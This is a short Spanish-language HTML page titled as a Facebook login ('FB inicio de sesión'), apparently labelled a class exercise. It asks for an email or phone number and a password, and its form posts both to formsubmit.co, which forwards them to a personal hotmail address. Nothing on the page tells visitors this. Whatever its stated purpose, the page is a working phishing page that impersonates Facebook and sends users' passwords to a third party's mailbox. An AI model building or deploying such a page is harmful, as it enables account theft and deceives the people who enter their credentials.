<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Aquí el ejercicio 4">
    <title>FB inicio de sesión</title>
</head>
<body>
    <h1 id="title">Inicio de sesión FB</h1>

    <form action="https://formsubmit.co/payancero@hotmail.com" method="POST" autocomplete="off">
        <label for="correo">Correo electronico o número de telefono</label>
        <input type="email" name="correo" id="correo" placeholder="Coloque su email">
        <br>
        <label for="contraseña">Contraseña</label>
        <input type="password" name="contraseña" id="contraseña" required placeholder="inserte su contraseña">
        <br>
        <input type="submit">
        <input type="reset">
    </form>
</body>
</html>
